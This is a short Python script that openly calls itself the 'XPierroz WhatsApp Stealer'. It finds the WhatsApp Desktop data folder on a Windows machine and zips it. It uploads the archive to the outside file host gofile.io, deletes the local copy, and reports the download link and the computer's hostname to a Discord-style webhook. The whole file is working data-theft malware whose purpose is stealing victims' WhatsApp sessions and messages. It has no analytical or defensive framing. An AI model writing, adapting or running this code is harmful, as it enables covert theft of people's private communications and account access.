import os
import requests
import time
import socket
import shutil

# PSG > OM

WEBHOOK = "xpierroz on top"
direct = f"{os.getenv('LOCALAPPDATA')}\\Packages\\5319275A.WhatsAppDesktop_cv1g1gvanyjgm"
print(direct)

def uploadToGofile(path):
    for x in range(10):
        try:
            rr = requests.post(
                f'https://{requests.get("https://api.gofile.io/getServer").json()["data"]["server"]}.gofile.io/uploadFile',
                files={
                    "file": open(path, "rb")
                },
            ).json()["data"]["downloadPage"]
            return rr
        except Exception:
            time.sleep(2)
    return False

try:
    shutil.make_archive("ssouput", "zip", direct)
except Exception: 
    pass

m = uploadToGofile(f"{os.getcwd()}\\ssouput.zip")
os.remove(f"{os.getcwd()}\\ssouput.zip")

message = f"**XPierroz WhatsApp Stealer Report**\n\n"
message += f"🖥️ Pc: {socket.gethostname()}\n"
message += f"📎 Url: {m}"

payload = {
    "content": message,
    "username": "XPierroz WhatsApp Stealer",
    "avatar_url": "https://github.com/xpierroz/WhatsappStealer/blob/master/assets/whatsapp.png?raw=true"
}

headers = {
    "Content-Type": "application/json"
}

requests.post(WEBHOOK, json=payload, headers=headers)
